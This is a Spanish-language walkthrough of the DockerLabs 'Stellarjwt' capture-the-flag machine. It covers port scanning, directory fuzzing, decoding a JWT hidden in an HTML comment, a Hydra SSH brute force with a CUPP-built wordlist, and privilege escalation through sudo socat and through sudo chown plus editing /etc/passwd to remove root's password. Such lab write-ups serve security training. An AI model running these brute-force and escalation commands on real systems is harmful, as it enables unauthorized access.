---
icon: flag
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
  tags:
    visible: true
  actions:
    visible: true
  anchors:
    visible: true
---

# Stellarjwt DockerLabs (Easy)

# Contexto de la maquina
## Trayectoria Stellarjwt

<figure><img src="../../.gitbook/assets/trayectoria_711048028b.png" alt=""><figcaption></figcaption></figure>

## Descripción

**Stellarjwt** es una máquina Linux de dificultad **Easy** en DockerLabs con una temática espacial de la NASA que requiere combinar técnicas web con **OSINT** (investigación de fuentes abiertas) para resolver la cadena de compromiso.

El acceso inicial parte de un JWT oculto en un comentario HTML del código fuente de la web, que revela el nombre de usuario `neptuno`. La fuerza bruta con rockyou.txt no da resultado, lo que obliga a hacer OSINT sobre el planeta Neptuno para descubrir que su descubridor fue **Johann Gottfried Galle**, y generar un diccionario personalizado con **CUPP** para crackear la contraseña SSH. Una vez dentro, una carta de texto plano en el home de `neptuno` revela la contraseña del usuario `nasa` de forma directa (el fundador de la NASA). Desde `nasa`, el permiso `sudo socat` sin contraseña como `elite` permite obtener una shell interactiva. Finalmente, `elite` puede ejecutar `sudo chown` como `root`, lo que permite cambiar el propietario de `/etc/passwd` y editar el archivo para eliminar la contraseña de `root`, escalando sin contraseña.

**Objetivo**

- Extraer el JWT oculto en el comentario HTML de `/universe` y decodificarlo.
- Hacer OSINT sobre Neptuno para construir un diccionario con CUPP.
- Acceder por SSH como `neptuno` con la contraseña `Gottfried`.
- Leer la carta del home de `neptuno` para obtener la contraseña de `nasa`.
- Escalar a `elite` con `sudo socat` y a `root` con `sudo chown` sobre `/etc/passwd`.

**Tipo de máquina**

- Plataforma: DockerLabs
- Sistema operativo: Linux (Ubuntu)
- Categoría principal: Web / OSINT / Linux Privilege Escalation
- Componentes involucrados:
    - JWT oculto en comentario HTML del código fuente.
    - OSINT sobre el descubridor del planeta Neptuno.
    - Diccionario personalizado con CUPP.
    - Credenciales en texto plano en archivo de carta.
    - `sudo socat` para escalada lateral con shell interactiva.
    - `sudo chown` para modificar `/etc/passwd` y suprimir contraseña de `root`.
## Análisis de vulnerabilidades

<figure><img src="../../.gitbook/assets/carta_JWT_con_informaci_n_de_usuario_1793444754879.png" alt=""><figcaption></figcaption></figure>
<figure><img src="../../.gitbook/assets/carta_Contrase_a_SSH_derivable_media_1793444755382.png" alt=""><figcaption></figcaption></figure>
<figure><img src="../../.gitbook/assets/carta_Credenciales_del_usuario_nasa__1793444755855.png" alt=""><figcaption></figcaption></figure>
<figure><img src="../../.gitbook/assets/carta_sudo_socat_sin_contrase_a_perm_1793444756284.png" alt=""><figcaption></figcaption></figure>
<figure><img src="../../.gitbook/assets/carta_sudo_chown_sobre__etc_passwd_p_1793444756785.png" alt=""><figcaption></figcaption></figure>

## Instalación

Cuando obtenemos el `.zip` lo pasamos al entorno de trabajo y lo descomprimimos:

```shell
unzip stellarjwt.zip
```

Montamos la máquina con el script de despliegue automático de DockerLabs:

```shell
bash auto_deploy.sh stellarjwt.tar
```

Respuesta:

```
Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Cuando terminemos le damos a `Ctrl+C` para eliminar el contenedor y no dejar archivos residuales.
# Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Respuesta:

```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-22 18:23 +0000
Nmap scan report for 172.17.0.2
Host is up (0.000033s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: NASA Hackeada
|_http-server-header: Apache/2.4.58 (Ubuntu)

Nmap done: 1 IP address (1 host up) scanned in 7.18 seconds
```

Dos puertos abiertos:

- **Puerto 22** → SSH (OpenSSH 9.6p1), que usaremos más adelante para el acceso inicial.
- **Puerto 80** → HTTP (Apache 2.4.58). El título `NASA Hackeada` ya anticipa la temática de la máquina.
## Enumeración web

Accedemos a la web:

```
URL = http://<IP>/
```

Respuesta:

<figure><img src="../../.gitbook/assets/Pasted image 20260922202856.png" alt=""><figcaption></figcaption></figure>

Vemos la página por defecto de Apache sin contenido relevante. Realizamos fuzzing de directorios para encontrar rutas ocultas.
# Gobuster

<figure><img src="../../.gitbook/assets/vuln_JWT_con_información_de_usuario_f2ef819f.png" alt=""><figcaption></figcaption></figure>

## Fuzzing de directorios

```bash
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 100 -k -r
```

Respuesta:

```
universe             (Status: 200) [Size: 11253]
index.html           (Status: 200) [Size: 1905]
server-status        (Status: 403) [Size: 275]
```

Encontramos el directorio `universe`. Accedemos:

```
URL = http://<IP>/universe
```

Respuesta:

<figure><img src="../../.gitbook/assets/Pasted image 20260922203116.png" alt=""><figcaption></figcaption></figure>

La página parece estar vacía visualmente. En estos casos siempre merece la pena revisar el **código fuente** de la página (`Ctrl+U` en el navegador), ya que los comentarios HTML no son visibles en el renderizado pero sí en el código.
## Descubrimiento del JWT en el código fuente

Al inspeccionar el código fuente de `/universe`, vemos que está repleto de texto largo en comentarios HTML. Al llegar al final del bloque de comentarios, encontramos algo que rompe el patrón del texto: una cadena con el formato característico de un **JWT** (tres grupos de caracteres Base64 separados por puntos):

```html
<!-- eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwidXNlciI6Im5lcHR1bm8iLCJpYXQiOjE1MTYyMzkwMjJ9.t-UG_wEbJdc_t0spVGKkNaoVaOeNnQwzvQOfq0G3PcE -->
```

Un **JWT** (JSON Web Token) tiene tres partes separadas por puntos: `header.payload.signature`. Las dos primeras están codificadas en Base64 y son legibles sin necesidad de la clave secreta. Lo decodificamos en [jwt.io](https://jwt.io) o con cualquier herramienta:

<figure><img src="../../.gitbook/assets/Pasted image 20260922203518.png" alt=""><figcaption></figcaption></figure>

El payload del JWT revela:

```json
{
  "sub": "1234567890",
  "user": "neptuno",
  "iat": 1516239022
}
```

El campo `user` nos da directamente el nombre de usuario: **`neptuno`**.
# Escalate user neptuno

<figure><img src="../../.gitbook/assets/vuln_Contraseña_SSH_derivable_media_62a98231.png" alt=""><figcaption></figcaption></figure>

## OSINT: investigación sobre el descubridor de Neptuno

Sabiendo que el usuario es `neptuno`, lanzamos una fuerza bruta SSH con `rockyou.txt`, pero no da resultado. En esta máquina la contraseña no está en un diccionario estándar, sino que requiere **OSINT**: investigar quién descubrió el planeta Neptuno para usar esa información como base del diccionario.

La búsqueda revela que Neptuno fue descubierto por **Johann Gottfried Galle** en 1846. Con el nombre completo del descubridor, podemos generar un diccionario personalizado con **CUPP** (Common User Passwords Profiler), una herramienta que crea variaciones de contraseñas basándose en datos personales del objetivo o de alguien relacionado con él:

<figure><img src="../../.gitbook/assets/Pasted image 20260923175845.png" alt=""><figcaption></figcaption></figure>
## Generación del diccionario personalizado con CUPP

CUPP genera automáticamente variaciones del nombre completo: mayúsculas/minúsculas, combinaciones de nombre y apellido, con números al final, etc. Introducimos los datos de Johann Gottfried Galle:

```bash
cupp -i
```

Respuesta:

```
> First Name: Johann
> Surname: Gottfried
> Nickname: galle
> Birthdate (DDMMYYYY):
...
> Do you want to add special chars at the end of words? Y/[N]: n
> Do you want to add some random numbers at the end of words? Y/[N]: n
> Leet mode? Y/[N]: n

[+] Saving dictionary to johann.txt, counting 232 words.
```

CUPP genera 232 variaciones. Entre ellas estará `Gottfried`, el apellido del descubridor.
## Fuerza bruta SSH con el diccionario personalizado

<figure><img src="../../.gitbook/assets/vuln_Credenciales_del_usuario_nasa__3c0edce5.png" alt=""><figcaption></figcaption></figure>

Con el diccionario generado, lanzamos Hydra contra SSH:

```bash
hydra -l neptuno -P johann.txt ssh://<IP> -t 64 -I
```

Respuesta:

```
[22][ssh] host: 172.17.0.2   login: neptuno   password: Gottfried
```

La contraseña es `Gottfried`. Accedemos por SSH:

```bash
ssh neptuno@<IP>
# Contraseña: Gottfried
```

Respuesta:

```
neptuno@fdeda7ed9d38:~$ whoami
neptuno
```
# Escalate user nasa

<figure><img src="../../.gitbook/assets/vuln_sudo_socat_sin_contraseña_perm_8f25858e.png" alt=""><figcaption></figcaption></figure>

## Lectura de la carta en el home de neptuno

Listamos el home de `neptuno`:

```bash
ls -la
```

Hay un archivo llamado `.carta_a_la_NASA.txt`. En pentesting siempre hay que revisar los archivos de texto del home de un usuario, ya que suelen contener notas, credenciales o pistas dejadas por el creador de la máquina:

```bash
cat .carta_a_la_NASA.txt
```

Respuesta:

```
Buenos días, quiero entrar en la NASA. Ya respondí las preguntas que me hicieron. Se las respondo de nuevo por aquí.

¿Qué significan las siglas NASA? -> National Aeronautics and Space Administration
¿En que año se fundo la NASA? -> 1958
¿Quién fundó la NASA? -> Eisenhower
```

La carta responde directamente la pregunta `¿Quién fundó la NASA?` con `Eisenhower`. Combinando esto con los usuarios del sistema (donde el siguiente usuario después de `neptuno` es `nasa`), la respuesta del fundador es claramente la contraseña de `nasa`:

```bash
su nasa
# Contraseña: Eisenhower
```

Respuesta:

```
nasa@fdeda7ed9d38:/home/neptuno$ whoami
nasa
```
# Escalate user elite
## sudo socat como elite

```bash
sudo -l
```

Respuesta:

```
(elite) NOPASSWD: /usr/bin/socat
```

`nasa` puede ejecutar `socat` como `elite` sin contraseña. **socat** es una herramienta de retransmisión bidireccional de datos entre dos canales, ampliamente usada en redes. Con los parámetros `exec:/bin/bash,pty,ctty,raw,echo=0` le indicamos que uno de los canales sea una shell bash con una PTY (pseudo-terminal) completa, lo que resulta en una shell interactiva con los privilegios del usuario objetivo:

```bash
sudo -u elite socat - exec:/bin/bash,pty,ctty,raw,echo=0
```

Respuesta:

```
elite@fdeda7ed9d38:/home/nasa$ whoami
elite
```

Somos `elite`.
# Escalate Privileges

<figure><img src="../../.gitbook/assets/vuln_sudo_chown_sobre__etc_passwd_p_08aa858e.png" alt=""><figcaption></figcaption></figure>

## sudo chown sobre /etc/passwd

```bash
sudo -l
```

Respuesta:

```
(root) NOPASSWD: /usr/bin/chown
```

`elite` puede ejecutar `chown` como `root` sin contraseña. El plan de ataque es el siguiente:

1. Usar `sudo chown` para cambiar el propietario de `/etc/passwd` a `elite`.
2. Con permisos de escritura sobre `/etc/passwd`, eliminar el campo `x` de la entrada de `root` (que indica que la contraseña está almacenada en `/etc/shadow`).
3. Sin ese campo, Linux considera que `root` no tiene contraseña y permite el acceso directo con `su root`.
## Modificación de /etc/passwd para suprimir la contraseña de root

**Paso 1:** Cambiamos el propietario de `/etc/passwd`:

```bash
sudo chown elite:elite /etc/passwd
```

**Paso 2:** Eliminamos el campo `x` de la entrada de `root` con `sed`. El flag `s/^root:x:/root::/` sustituye `root:x:` por `root::` en la línea que empiece por `root:`:

```bash
sed 's/^root:x:/root::/' /etc/passwd > /tmp/passwd.new
cat /tmp/passwd.new > /etc/passwd
```

**Paso 3:** Accedemos como `root` sin contraseña:

```bash
su root
```

Respuesta:

```
root@fdeda7ed9d38:/home/nasa# whoami
root
```

Ya somos `root`. La máquina está completamente comprometida.

